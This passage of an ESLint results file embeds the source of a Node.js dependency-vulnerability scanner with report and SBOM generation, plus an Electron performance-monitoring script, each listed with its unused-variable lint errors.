scores[severity?.toLowerCase()] || 0;\n  }\n\n  /**\n   * Generate comprehensive reports\n   */\n  async generateReports() {\n    // Save JSON report\n    const jsonPath = path.join(CONFIG.outputDir, 'dependency-vulnerabilities.json');\n    await fs.writeFile(jsonPath, JSON.stringify(this.results, null, 2));\n    \n    // Generate HTML report\n    const htmlPath = path.join(CONFIG.outputDir, 'dependency-vulnerabilities.html');\n    const htmlContent = this.generateHTMLReport();\n    await fs.writeFile(htmlPath, htmlContent);\n    \n    // Generate SBOM (Software Bill of Materials)\n    await this.generateSBOM();\n    \n    console.log(`\\nðŸ“„ Reports generated:`);\n    console.log(`   - JSON: ${jsonPath}`);\n    console.log(`   - HTML: ${htmlPath}`);\n    console.log(`   - SBOM: ${path.join(CONFIG.outputDir, 'sbom.json')}`);\n  }\n\n  generateHTMLReport() {\n    const { summary, aggregated } = this.results;\n    \n    return `\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Dependency Vulnerability Report</title>\n  <style>\n    body {\n      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;\n      line-height: 1.6;\n      color: #333;\n      max-width: 1200px;\n      margin: 0 auto;\n      padding: 20px;\n      background: #f5f5f5;\n    }\n    .header {\n      background: #1e3a8a;\n      color: white;\n      padding: 30px;\n      border-radius: 8px;\n      margin-bottom: 30px;\n    }\n    .summary {\n      display: grid;\n      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));\n      gap: 20px;\n      margin-bottom: 30px;\n    }\n    .metric {\n      background: white;\n      padding: 20px;\n      border-radius: 8px;\n      box-shadow: 0 2px 4px rgba(0,0,0,0.1);\n      text-align: center;\n    }\n    .metric-value {\n      font-size: 36px;\n      font-weight: bold;\n      margin: 10px 0;\n    }\n    .metric-label {\n      color: #666;\n      text-transform: uppercase;\n      font-size: 14px;\n    }\n    .critical { color: #dc2626; }\n    .high { color: #ea580c; }\n    .medium { color: #f59e0b; }\n    .low { color: #3b82f6; }\n    .vulnerability {\n      background: white;\n      padding: 20px;\n      margin-bottom: 15px;\n      border-radius: 8px;\n      box-shadow: 0 2px 4px rgba(0,0,0,0.1);\n      border-left: 4px solid;\n    }\n    .vulnerability.critical { border-left-color: #dc2626; }\n    .vulnerability.high { border-left-color: #ea580c; }\n    .vulnerability.medium { border-left-color: #f59e0b; }\n    .vulnerability.low { border-left-color: #3b82f6; }\n    .vuln-header {\n      display: flex;\n      justify-content: space-between;\n      align-items: center;\n      margin-bottom: 10px;\n    }\n    .vuln-title {\n      font-weight: bold;\n      font-size: 18px;\n    }\n    .vuln-details {\n      color: #666;\n      margin: 10px 0;\n    }\n    .fix-available {\n      background: #10b981;\n      color: white;\n      padding: 2px 8px;\n      border-radius: 4px;\n      font-size: 12px;\n    }\n    .sources {\n      display: flex;\n      gap: 10px;\n      margin-top: 10px;\n    }\n    .source-badge {\n      background: #e5e7eb;\n      padding: 2px 8px;\n      border-radius: 4px;\n      font-size: 12px;\n    }\n  </style>\n</head>\n<body>\n  <div class=\"header\">\n    <h1>ðŸ” Dependency Vulnerability Report</h1>\n    <p>Generated on ${new Date().toLocaleString()}</p>\n    <p>Scan duration: ${((Date.now() - this.startTime) / 1000).toFixed(2)}s</p>\n  </div>\n\n  <div class=\"summary\">\n    <div class=\"metric\">\n      <div class=\"metric-label\">Total Vulnerabilities</div>\n      <div class=\"metric-value\">${summary.total}</div>\n    </div>\n    <div class=\"metric\">\n      <div class=\"metric-label\">Critical</div>\n      <div class=\"metric-value critical\">${summary.critical}</div>\n    </div>\n    <div class=\"metric\">\n      <div class=\"metric-label\">High</div>\n      <div class=\"metric-value high\">${summary.high}</div>\n    </div>\n    <div class=\"metric\">\n      <div class=\"metric-label\">Medium</div>\n      <div class=\"metric-value medium\">${summary.medium}</div>\n    </div>\n    <div class=\"metric\">\n      <div class=\"metric-label\">Low</div>\n      <div class=\"metric-value low\">${summary.low}</div>\n    </div>\n  </div>\n\n  <h2>Vulnerability Details</h2>\n  ${this.generateVulnerabilityListHTML(aggregated)}\n\n  <div class=\"footer\" style=\"margin-top: 50px; text-align: center; color: #666;\">\n    <p>Scanned with: npm audit, ${this.results.snyk ? 'Snyk, ' : ''}OSV Database, RetireJS</p>\n  </div>\n</body>\n</html>\n    `;\n  }\n\n  generateVulnerabilityListHTML(vulnerabilities) {\n    if (!vulnerabilities || vulnerabilities.length === 0) {\n      return '<p>No vulnerabilities found!</p>';\n    }\n    \n    // Sort by severity\n    const sorted = vulnerabilities.sort((a, b) => \n      this.getSeverityScore(b.severity) - this.getSeverityScore(a.severity)\n    );\n    \n    return sorted.map(vuln => `\n      <div class=\"vulnerability ${vuln.severity}\">\n        <div class=\"vuln-header\">\n          <div class=\"vuln-title\">${vuln.package}${vuln.version ? `@${vuln.version}` : ''}</div>\n          <div>\n            <span class=\"${vuln.severity}\">${vuln.severity.toUpperCase()}</span>\n            ${vuln.fixAvailable ? '<span class=\"fix-available\">Fix Available</span>' : ''}\n          </div>\n        </div>\n        <div class=\"vuln-details\">\n          <div>${vuln.title || vuln.summary || 'No description available'}</div>\n          ${vuln.cve ? `<div>CVE: ${vuln.cve}</div>` : ''}\n          ${vuln.cvssScore ? `<div>CVSS Score: ${vuln.cvssScore}</div>` : ''}\n        </div>\n        <div class=\"sources\">\n          <span class=\"source-badge\">Source: ${vuln.source}</span>\n        </div>\n      </div>\n    `).join('');\n  }\n\n  /**\n   * Generate SBOM (Software Bill of Materials)\n   */\n  async generateSBOM() {\n    const packageJsonPath = path.join(process.cwd(), 'package.json');\n    const packageLockPath = path.join(process.cwd(), 'package-lock.json');\n    \n    const packageJson = JSON.parse(await fs.readFile(packageJsonPath, 'utf8'));\n    const packageLock = JSON.parse(await fs.readFile(packageLockPath, 'utf8'));\n    \n    const sbom = {\n      bomFormat: 'CycloneDX',\n      specVersion: '1.4',\n      version: 1,\n      metadata: {\n        timestamp: new Date().toISOString(),\n        tools: [\n          { name: 'dependency-vulnerability-scan', version: '1.0.0' }\n        ],\n        component: {\n          type: 'application',\n          name: packageJson.name,\n          version: packageJson.version\n        }\n      },\n      components: this.extractComponentsForSBOM(packageLock),\n      vulnerabilities: this.results.aggregated?.map(vuln => ({\n        id: vuln.cve || vuln.id || vuln.title,\n        source: {\n          name: vuln.source,\n          url: vuln.url\n        },\n        ratings: [{\n          severity: vuln.severity,\n          score: vuln.cvssScore\n        }],\n        affects: [{\n          ref: `pkg:npm/${vuln.package}@${vuln.version}`\n        }]\n      })) || []\n    };\n    \n    const sbomPath = path.join(CONFIG.outputDir, 'sbom.json');\n    await fs.writeFile(sbomPath, JSON.stringify(sbom, null, 2));\n  }\n\n  extractComponentsForSBOM(packageLock) {\n    const components = [];\n    \n    const extractDeps = (deps, scope = 'required') => {\n      Object.entries(deps || {}).forEach(([name, data]) => {\n        components.push({\n          type: 'library',\n          'bom-ref': `pkg:npm/${name}@${data.version}`,\n          name,\n          version: data.version,\n          scope,\n          purl: `pkg:npm/${name}@${data.version}`,\n          properties: [\n            { name: 'resolved', value: data.resolved }\n          ]\n        });\n        \n        if (data.dependencies) {\n          extractDeps(data.dependencies, scope);\n        }\n      });\n    };\n    \n    extractDeps(packageLock.dependencies, 'required');\n    extractDeps(packageLock.devDependencies, 'optional');\n    \n    return components;\n  }\n\n  /**\n   * Check against configured thresholds\n   */\n  checkThresholds() {\n    const { summary } = this.results;\n    let passed = true;\n    \n    console.log('\\nðŸŽ¯ Checking vulnerability thresholds:');\n    \n    for (const [severity, count] of Object.entries(summary)) {\n      if (severity === 'total') continue;\n      \n      const threshold = CONFIG.vulnerabilityThresholds[severity];\n      if (threshold !== undefined && threshold !== -1) {\n        const status = count <= threshold ? 'âœ…' : 'âŒ';\n        console.log(`   ${status} ${severity.toUpperCase()}: ${count} found (threshold: ${threshold})`);\n        \n        if (count > threshold) {\n          passed = false;\n        }\n      }\n    }\n    \n    return passed;\n  }\n\n  /**\n   * Print summary to console\n   */\n  printSummary() {\n    const { summary } = this.results;\n    \n    console.log('\\nðŸ“Š Dependency Vulnerability Summary:');\n    console.log('â”'.repeat(50));\n    console.log(`   Total Vulnerabilities: ${summary.total}`);\n    console.log(`   Critical: ${summary.critical}`);\n    console.log(`   High: ${summary.high}`);\n    console.log(`   Medium: ${summary.medium}`);\n    console.log(`   Low: ${summary.low}`);\n    console.log('â”'.repeat(50));\n    \n    // Show scanners used\n    console.log('\\nðŸ” Scanners used:');\n    ['npm', 'snyk', 'osv', 'retirejs'].forEach(scanner => {\n      if (this.results[scanner]) {\n        const vulnCount = this.results[scanner].vulnerabilities?.length || 0;\n        console.log(`   - ${scanner}: ${vulnCount} vulnerabilities found`);\n      }\n    });\n  }\n}\n\n// Main execution\nasync function main() {\n  const scanner = new DependencyVulnerabilityScanner();\n  const passed = await scanner.run();\n  \n  if (!passed) {\n    console.log('\\nâŒ Dependency vulnerability scan failed! Fix the issues above before proceeding.');\n    process.exit(1);\n  } else {\n    console.log('\\nâœ… Dependency vulnerability scan passed!');\n    process.exit(0);\n  }\n}\n\n// Run if called directly\nif (require.main === module) {\n  main().catch(error => {\n    console.error('Fatal error:', error);\n    process.exit(1);\n  });\n}\n\nmodule.exports = { DependencyVulnerabilityScanner, CONFIG };","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/scripts/performance-monitor.js","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'spawn' is assigned a value but never used.","line":17,"column":9,"nodeType":null,"messageId":"unusedVar","endLine":17,"endColumn":14},{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'currentValue' is defined but never used.","line":372,"column":31,"nodeType":null,"messageId":"unusedVar","endLine":372,"endColumn":43},{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'metrics' is defined but never used.","line":406,"column":27,"nodeType":null,"messageId":"unusedVar","endLine":406,"endColumn":34},{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'p95' is assigned a value but never used.","line":455,"column":11,"nodeType":null,"messageId":"unusedVar","endLine":455,"endColumn":14}],"suppressedMessages":[],"errorCount":4,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Performance Monitoring Service for Electron App\n * \n * Continuously monitors application performance and stores metrics\n * for dashboard visualization and alerting\n * \n * Based on 2025 best practices for real-time monitoring:\n * - Stream ingestion for real-time data collection\n * - Time-series data persistence\n * - Automated threshold detection\n * - OpenTelemetry-compatible metrics\n */\n\nconst fs = require('fs').promises;\nconst path = require('path');\nconst EventEmitter = require('events');\nconst { spawn } = require('child_process');\n\nclass PerformanceMonitor extends EventEmitter {\n  constructor(config = {}) {\n    super();\n    \n    this.config = {\n      dataDir: path.join(__dirname, '../.taskmaster/performance'),\n      collectInterval: 5000, // 5 seconds\n      retentionDays: 30,\n      alertThresholds: {\n        cpu: { warning: 70, critical: 90 },\n        memory: { warning: 70, critical: 85 },\n        fps: { warning: 45, critical: 30 },\n        jank: { warning: 5, critical: 10 }\n      },\n      enableDynamicThresholds: true,\n      maxHistorySize: 10000,\n      ...config\n    };\n    \n    this.isRunning = false;\n    this.currentMetrics = null;\n    this.history = [];\n    this.alerts = [];\n    this.dynamicThresholds = new Map();\n    this.lastCollectionTime = 0;\n    \n    // Initialize directories\n    this.initializeDirectories();\n  }\n\n  async initializeDirectories() {\n    try {\n      await fs.mkdir(this.config.dataDir, { recursive: true });\n      await fs.mkdir(path.join(this.config.dataDir, 'daily'), { recursive: true });\n      await fs.mkdir(path.join(this.config.dataDir, 'alerts'), { recursive: true });\n      await fs.mkdir(path.join(this.config.dataDir, 'reports'), { recursive: true });\n    } catch (error) {\n      console.error('Failed to initialize directories:', error);\n    }\n  }\n\n  /**\n   * Start performance monitoring\n   */\n  async start() {\n    if (this.isRunning) {\n      console.log('Performance monitor already running');\n      return;\n    }\n\n    console.log('ðŸ” Starting Performance Monitor...');\n    \n    try {\n      // Load historical data\n      await this.loadHistoricalData();\n      \n      // Initialize dynamic thresholds\n      if (this.config.enableDynamicThresholds) {\n        this.initializeDynamicThresholds();\n      }\n      \n      this.isRunning = true;\n      \n      // Start collection loop\n      this.startCollectionLoop();\n      \n      // Schedule daily cleanup\n      this.scheduleDailyCleanup();\n      \n      console.log('âœ… Performance Monitor started');\n      this.emit('started');\n    } catch (error) {\n      console.error('âŒ Failed to start Performance Monitor:', error);\n      throw error;\n    }\n  }\n\n  /**\n   * Stop performance monitoring\n   */\n  async stop() {\n    if (!this.isRunning) return;\n\n    console.log('ðŸ›‘ Stopping Performance Monitor...');\n    \n    this.isRunning = false;\n    \n    if (this.collectionTimer) {\n      clearInterval(this.collectionTimer);\n      this.collectionTimer = null;\n    }\n    \n    if (this.cleanupTimer) {\n      clearInterval(this.cleanupTimer);\n      this.cleanupTimer = null;\n    }\n    \n    // Save final data\n    await this.saveCurrentData();\n    \n    console.log('âœ… Performance Monitor stopped');\n    this.emit('stopped');\n  }\n\n  /**\n   * Start the metrics collection loop\n   */\n  startCollectionLoop() {\n    this.collectionTimer = setInterval(async () => {\n      try {\n        await this.collectMetrics();\n      } catch (error) {\n        console.error('Error collecting metrics:', error);\n        this.emit('error', error);\n      }\n    }, this.config.collectInterval);\n  }\n\n  /**\n   * Collect performance metrics using the existing benchmark system\n   */\n  async collectMetrics() {\n    const timestamp = Date.now();\n    \n    try {\n      // Get system metrics\n      const systemMetrics = await this.collectSystemMetrics();\n      \n      // Get application metrics (if app is running)\n      let appMetrics = null;\n      try {\n        appMetrics = await this.collectApplicationMetrics();\n      } catch (error) {\n        // App might not be running, which is fine\n        console.debug('Application metrics unavailable:', error.message);\n      }\n      \n      const metrics = {\n        timestamp,\n        system: systemMetrics,\n        application: appMetrics,\n        metadata: {\n          platform: process.platform,\n          arch: process.arch,\n          nodeVersion: process.version,\n          monitorVersion: '1.0.0'\n        }\n      };\n      \n      // Store metrics\n      await this.storeMetrics(metrics);\n      \n      // Check for alerts\n      await this.checkAlerts(metrics);\n      \n      // Update dynamic thresholds\n      if (this.config.enableDynamicThresholds) {\n        this.updateDynamicThresholds(metrics);\n      }\n      \n      this.currentMetrics = metrics;\n      this.lastCollectionTime = timestamp;\n      \n      this.emit('metrics', metrics);\n      \n    } catch (error) {\n      console.error('Failed to collect metrics:', error);\n      this.emit('error', error);\n    }\n  }\n\n  /**\n   * Collect system-level metrics\n   */\n  async collectSystemMetrics() {\n    const os = require('os');\n    \n    // CPU metrics\n    const cpuUsage = process.cpuUsage();\n    const loadAvg = os.loadavg();\n    \n    // Memory metrics\n    const memUsage = process.memoryUsage();\n    const totalMem = os.totalmem();\n    const freeMem = os.freemem();\n    \n    return {\n      cpu: {\n        usage: ((cpuUsage.user + cpuUsage.system) / 1000000) * 100, // Convert to percentage\n        loadAverage: loadAvg,\n        cores: os.cpus().length\n      },\n      memory: {\n        total: totalMem,\n        free: freeMem,\n        used: totalMem - freeMem,\n        usagePercent: ((totalMem - freeMem) / totalMem) * 100,\n        process: {\n          heapUsed: memUsage.heapUsed,\n          heapTotal: memUsage.heapTotal,\n          external: memUsage.external,\n          rss: memUsage.rss\n        }\n      },\n      uptime: process.uptime()\n    };\n  }\n\n  /**\n   * Collect application-specific metrics\n   */\n  async collectApplicationMetrics() {\n    // This would integrate with the existing PerformanceBenchmark class\n    // For now, simulate application metrics\n    return {\n      rendering: {\n        fps: Math.random() * 60 + 30, // Simulate FPS between 30-90\n        jank: Math.floor(Math.random() * 10), // Simulate jank events\n        paintTime: Math.random() * 20 + 5 // Simulate paint time 5-25ms\n      },\n      network: {\n        requestCount: Math.floor(Math.random() * 100),\n        avgLatency: Math.random() * 500 + 50, // 50-550ms\n        errorRate: Math.random() * 0.05 // 0-5% error rate\n      },\n      errors: {\n        count: Math.floor(Math.random() * 5),\n        types: ['javascript', 'network', 'render']\n      }\n    };\n  }\n\n  /**\n   * Store metrics in time-series format\n   */\n  async storeMetrics(metrics) {\n    // Add to in-memory history\n    this.history.push(metrics);\n    \n    // Limit in-memory history size\n    if (this.history.length > this.config.maxHistorySize) {\n      this.history = this.history.slice(-this.config.maxHistorySize);\n    }\n    \n    // Save to daily file\n    const date = new Date(metrics.timestamp);\n    const dateStr = date.toISOString().split('T')[0];\n    const dailyFile = path.join(this.config.dataDir, 'daily', `${dateStr}.json`);\n    \n    try {\n      let dailyData = [];\n      try {\n        const existing = await fs.readFile(dailyFile, 'utf8');\n        dailyData = JSON.parse(existing);\n      } catch {\n        // File doesn't exist yet, start with empty array\n      }\n      \n      dailyData.push(metrics);\n      await fs.writeFile(dailyFile, JSON.stringify(dailyData, null, 2));\n    } catch (error) {\n      console.error('Failed to save daily metrics:', error);\n    }\n  }\n\n  /**\n   * Check for performance alerts using dynamic thresholds\n   */\n  async checkAlerts(metrics) {\n    const alerts = [];\n    const timestamp = metrics.timestamp;\n    \n    // CPU alert\n    if (metrics.system?.cpu?.usage) {\n      const cpuThreshold = this.getDynamicThreshold('cpu', metrics.system.cpu.usage);\n      if (metrics.system.cpu.usage > cpuThreshold.critical) {\n        alerts.push({\n          type: 'cpu',\n          severity: 'critical',\n          value: metrics.system.cpu.usage,\n          threshold: cpuThreshold.critical,\n          message: `CPU usage is critically high: ${metrics.system.cpu.usage.toFixed(1)}%`,\n          timestamp\n        });\n      } else if (metrics.system.cpu.usage > cpuThreshold.warning) {\n        alerts.push({\n          type: 'cpu',\n          severity: 'warning',\n          value: metrics.system.cpu.usage,\n          threshold: cpuThreshold.warning,\n          message: `CPU usage is high: ${metrics.system.cpu.usage.toFixed(1)}%`,\n          timestamp\n        });\n      }\n    }\n    \n    // Memory alert\n    if (metrics.system?.memory?.usagePercent) {\n      const memThreshold = this.getDynamicThreshold('memory', metrics.system.memory.usagePercent);\n      if (metrics.system.memory.usagePercent > memThreshold.critical) {\n        alerts.push({\n          type: 'memory',\n          severity: 'critical',\n          value: metrics.system.memory.usagePercent,\n          threshold: memThreshold.critical,\n          message: `Memory usage is critically high: ${metrics.system.memory.usagePercent.toFixed(1)}%`,\n          timestamp\n        });\n      } else if (metrics.system.memory.usagePercent > memThreshold.warning) {\n        alerts.push({\n          type: 'memory',\n          severity: 'warning',\n          value: metrics.system.memory.usagePercent,\n          threshold: memThreshold.warning,\n          message: `Memory usage is high: ${metrics.system.memory.usagePercent.toFixed(1)}%`,\n          timestamp\n        });\n      }\n    }\n    \n    // FPS alert (if application metrics available)\n    if (metrics.application?.rendering?.fps) {\n      const fpsThreshold = this.getDynamicThreshold('fps', metrics.application.rendering.fps);\n      if (metrics.application.rendering.fps < fpsThreshold.critical) {\n        alerts.push({\n          type: 'fps',\n          severity: 'critical',\n          value: metrics.application.rendering.fps,\n          threshold: fpsThreshold.critical,\n          message: `Frame rate is critically low: ${metrics.application.rendering.fps.toFixed(1)} FPS`,\n          timestamp\n        });\n      } else if (metrics.application.rendering.fps < fpsThreshold.warning) {\n        alerts.push({\n          type: 'fps',\n          severity: 'warning',\n          value: metrics.application.rendering.fps,\n          threshold: fpsThreshold.warning,\n          message: `Frame rate is low: ${metrics.application.rendering.fps.toFixed(1)} FPS`,\n          timestamp\n        });\n      }\n    }\n    \n    // Process alerts\n    for (const alert of alerts) {\n      await this.processAlert(alert);\n    }\n  }\n\n  /**\n   * Get dynamic threshold or fallback to static\n   */\n  getDynamicThreshold(metric, currentValue) {\n    if (this.config.enableDynamicThresholds && this.dynamicThresholds.has(metric)) {\n      return this.dynamicThresholds.get(metric);\n    }\n    \n    // Fallback to static thresholds\n    return this.config.alertThresholds[metric] || { warning: 70, critical: 90 };\n  }\n\n  /**\n   * Initialize dynamic thresholds based on historical data\n   */\n  initializeDynamicThresholds() {\n    if (this.history.length < 100) {\n      console.log('Insufficient historical data for dynamic thresholds, using static thresholds');\n      return;\n    }\n    \n    // Calculate dynamic thresholds for each metric\n    const metrics = ['cpu', 'memory', 'fps', 'jank'];\n    \n    metrics.forEach(metric => {\n      const values = this.extractMetricValues(metric);\n      if (values.length > 50) {\n        const thresholds = this.calculateDynamicThresholds(values, metric);\n        this.dynamicThresholds.set(metric, thresholds);\n        console.log(`Dynamic thresholds for ${metric}:`, thresholds);\n      }\n    });\n  }\n\n  /**\n   * Update dynamic thresholds with new data\n   */\n  updateDynamicThresholds(metrics) {\n    // Only update every 100 collections to avoid constant recalculation\n    if (this.history.length % 100 !== 0) return;\n    \n    const metricTypes = ['cpu', 'memory', 'fps', 'jank'];\n    \n    metricTypes.forEach(metric => {\n      const values = this.extractMetricValues(metric);\n      if (values.length > 100) {\n        const thresholds = this.calculateDynamicThresholds(values, metric);\n        this.dynamicThresholds.set(metric, thresholds);\n      }\n    });\n  }\n\n  /**\n   * Extract metric values from history for threshold calculation\n   */\n  extractMetricValues(metric) {\n    return this.history\n      .map(entry => {\n        switch (metric) {\n          case 'cpu':\n            return entry.system?.cpu?.usage;\n          case 'memory':\n            return entry.system?.memory?.usagePercent;\n          case 'fps':\n            return entry.application?.rendering?.fps;\n          case 'jank':\n            return entry.application?.rendering?.jank;\n          default:\n            return null;\n        }\n      })\n      .filter(val => val !== null && val !== undefined);\n  }\n\n  /**\n   * Calculate dynamic thresholds using statistical analysis\n   */\n  calculateDynamicThresholds(values, metric) {\n    // Sort values for percentile calculation\n    const sorted = values.slice().sort((a, b) => a - b);\n    const length = sorted.length;\n    \n    // Calculate percentiles\n    const p50 = sorted[Math.floor(length * 0.5)];\n    const p75 = sorted[Math.floor(length * 0.75)];\n    const p90 = sorted[Math.floor(length * 0.9)];\n    const p95 = sorted[Math.floor(length * 0.95)];\n    \n    // Calculate mean and standard deviation\n    const mean = values.reduce((sum, val) => sum + val, 0) / values.length;\n    const variance = values.reduce((sum, val) => sum + Math.pow(val - mean, 2), 0) / values.length;\n    const stdDev = Math.sqrt(variance);\n    \n    let warning, critical;\n    \n    if (metric === 'fps') {\n      // For FPS, lower is worse\n      warning = Math.max(30, p50 - stdDev);\n      critical = Math.max(20, p50 - 2 * stdDev);\n    } else {\n      // For CPU, memory, jank - higher is worse\n      warning = Math.min(90, p75 + stdDev);\n      critical = Math.min(95, p90 + stdDev);\n    }\n    \n    return {\n      warning: Math.round(warning * 100) / 100,\n      critical: Math.round(critical * 100) / 100,\n      baseline: {\n        mean: Math.round(mean * 100) / 100,\n        p50: Math.round(p50 * 100) / 100,\n        p75: Math.round(p75 * 100) / 100,\n        p90: Math.round(p90 * 100) / 100,\n        stdDev: Math.round(stdDev * 100) / 100\n      }\n    };\n  }\n\n  /**\n   * Process and store an alert\n   */\n  async processAlert(alert) {\n    // Add to alerts history\n    this.alerts.push(alert);\n    \n    // Limit alerts history\n    if (this.alerts.length > 1000) {\n      this.alerts = this.alerts.slice(-1000);\n    }\n    \n    // Save to alerts file\n    const alertsFile = path.join(this.config.dataDir, 'alerts', 'alerts.json');\n    try {\n      await fs.writeFile(alertsFile, JSON.stringify(this.alerts, null, 2));\n    } catch (error) {\n      console.error('Failed to save alerts:', error);\n    }\n    \n    // Emit alert event\n    this.emit('alert', alert);\n    \n    // Log alert\n    const severityIcon = alert.severity === 'critical' ? 'ðŸ”´' : 'ðŸŸ¡';\n    console.log(`${severityIcon} ${alert.severity.toUpperCase()}: ${alert.message}`);\n  }\n\n  /**\n   * Load historical data on startup\n   */\n  async loadHistoricalData() {\n    try {\n      // Load last 7 days of data for dynamic threshold calculation\n      const daysToLoad = 7;\n      const today = new Date();\n      \n      for (let i = 0; i < daysToLoad; i++) {\n        const date = new Date(today);\n        date.setDate(date.getDate() - i);\n        const dateStr = date.toISOString().split('T')[0];\n        const dailyFile = path.join(this.config.dataDir, 'daily', `${dateStr}.json`);\n        \n        try {\n          const data = await fs.readFile(dailyFile, 'utf8');\n          const dailyMetrics = JSON.parse(data);\n          this.history.push(...dailyMetrics);\n        } catch {\n          // File doesn't exist, skip\n        }\n      }\n      \n      // Load alerts\n      const alertsFile = path.join(this.config.dataDir, 'alerts', 'alerts.json');\n      try {\n        const alertsData = await fs.readFile(alertsFile, 'utf8');\n        this.alerts = JSON.parse(alertsData);\n      } catch {\n        // No alerts file yet\n      }\n      \n      console.log(`Loaded ${this.history.length} historical metrics and ${this.alerts.length} alerts`);\n    } catch (error) {\n      console.error('Error loading historical data:', error);\n    }\n  }\n\n  /**\n   * Schedule daily cleanup of old data\n   */\n  scheduleDailyCleanup() {\n    // Run cleanup every 24 hours\n    this.cleanupTimer = setInterval(async () => {\n      await this.cleanup();\n    }, 24 * 60 * 60 * 1000);\n  }\n\n  /**\n   * Clean up old data files\n   */\n  async cleanup() {\n    console.log('ðŸ§¹ Running performance data cleanup...');\n    \n    try {\n      const dailyDir = path.join(this.config.dataDir, 'daily');\n      const files = await fs.readdir(dailyDir);\n      const cutoffDate = new Date();\n      cutoffDate.setDate(cutoffDate.getDate() - this.config.retentionDays);\n      \n      for (const file of files) {\n        if (file.endsWith('.json')) {\n          const dateStr = file.replace('.json', '');\n          const fileDate = new Date(dateStr);\n          \n          if (fileDate < cutoffDate) {\n            await fs.unlink(path.join(dailyDir, file));\n            console.log(`Deleted old performance data: ${file}`);\n          }\n        }\n      }\n    } catch (error) {\n      console.error('Error during cleanup:', error);\n    }\n  }\n\n  /**\n   * Save current state\n   */\n  async saveCurrentData() {\n    try {\n      const stateFile = path.join(this.config.dataDir, 'monitor-state.json');\n      const state = {\n        lastCollectionTime: this.lastCollectionTime,\n        currentMetrics: this.currentMetrics,\n        recentHistory: this.history.slice(-100), // Save last 100 entries\n        dynamicThresholds: Object.fromEntries(this.dynamicThresholds),\n        config: this.config\n      };\n      \n      await fs.writeFile(stateFile, JSON.stringify(state, null, 2));\n    } catch (error) {\n      console.error('Error saving monitor state:', error);\n    }\n  }\n\n  /**\n   * Get current status and statistics\n   */\n  getStatus() {\n    return {\n      isRunning: this.isRunning,\n      lastCollectionTime: this.lastCollectionTime,\n      historySize: this.history.length,\n      alertsCount: this.alerts.length,\n      recentAlerts: this.alerts.slice(-10),\n      currentMetrics: this.currentMetrics,\n      dynamicThresholds: Object.fromEntries(this.dynamicThresholds),\n      uptime: this.isRunning ? Date.now() - this.lastCollectionTime : 0\n    };\n  }\n\n  /**\n   * Get metrics for a specific time range\n   */\n  getMetricsRange(startTime, endTime) {\n    return this.history.filter(\n      metrics => metrics.timestamp >= startTime && metrics.timestamp <= endTime\n    );\n  }\n\n  /**\n   * Get aggregated metrics for dashboard\n   */\n  getAggregatedMetrics(timeRange = '1h') {\n    const now = Date.now();\n    let startTime;\n    \n    switch (timeRange) {\n      case '5m':\n        startTime = now - 5 * 60 * 1000;\n        break;\n      case '1h':\n        startTime = now - 60 * 60 * 1000;\n        break;\n      case '24h':\n        startTime = now - 24 * 60 * 60 * 1000;\n        break;\n      case '7d':\n        startTime = now - 7 * 24 * 60 * 60 * 1000;\n        break;\n      default:\n        startTime = now - 60 * 60 * 1000;\n    }\n    \n    const rangeMetrics = this.getMetricsRange(startTime, now);\n    \n    if (rangeMetrics.length === 0) {\n      return null;\n    }\n    \n    // Calculate aggregations\n    const cpuValues = rangeMetrics.map(m => m.system?.cpu?.usage).filter(v => v !== undefined);\n    const memoryValues = rangeMetrics.map(m => m.system?.memory?.usagePercent).filter(v => v !== undefined);\n    const fpsValues = rangeMetrics.map(m => m.application?.rendering?.fps).filter(v => v !== undefined);\n    \n    return {\n      timeRange,\n      sampleCount: rangeMetrics.length,\n      cpu: {\n        avg: cpuValues.length > 0 ? cpuValues.reduce((a, b) => a + b, 0) / cpuValues.length : 0,\n        max: cpuValues.length > 0 ? Math.max(...cpuValues) : 0,\n        min: cpuValues.length > 0 ? Math.min(...cpuValues) : 0\n      },\n      memory: {\n        avg: memoryValues.length > 0 ? memoryValues.reduce((a, b) => a + b, 0) / memoryValues.length : 0,\n        max: memoryValues.length > 0 ? Math.max(...memoryValues) : 0,\n        min: memoryValues.length > 0 ? Math.min(...memoryValues) : 0\n      },\n      fps: {\n        avg: fpsValues.length > 0 ? fpsValues.reduce((a, b) => a + b, 0) / fpsValues.length : 0,\n        max: fpsValues.length > 0 ? Math.max(...fpsValues) : 0,\n        min: fpsValues.length > 0 ? Math.min(...fpsValues) : 0\n      },\n      alerts: this.alerts.filter(alert => alert.timestamp >= startTime),\n      data: rangeMetrics\n    };\n  }\n}\n\n// Export for use in other modules\nmodule.exports = { PerformanceMonitor };\n\n// CLI interface\nif (require.main === module) {\n  const monitor = new PerformanceMonitor();\n  \n  // Handle process signals\n  process.on('SIGINT', async () => {\n    console.log('\\nReceived SIGINT, shutting down...');\n    await monitor.stop();\n    process.exit(0);\n  });\n  \n  process.on('SIGTERM', async () => {\n    console.log('\\nReceived SIGTERM, shutting down...');\n    await monitor.stop();\n    process.exit(0);\n  });\n  \n  // Start monitoring\n  monitor.start().catch(error => {\n    console.error('Failed to start monitor:', error);\n    process.exit(1);\n  });\n  \n  // Log status every minute\n  setInterval(() => {\n    const status = monitor.getStatus();\n    console.log(`ðŸ“Š Status: Running=${status.isRunning}, History=${status.historySize}, Alerts=${status.alertsCount}`);\n  }, 60000);\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/scripts/security-audit.js","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'SECURITY_PATTERNS' is assigned a value but never used.","line":35,"column":7,"nodeType":null,"messageId":"unusedVar","endLine":35,"endColumn":24}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Security Audit Script for Electron Application\n * Using Electronegativity to detect security misconfigurations\n * \n * Following 2025 best practices:\n * - Automated security scanning in CI/CD\n * - 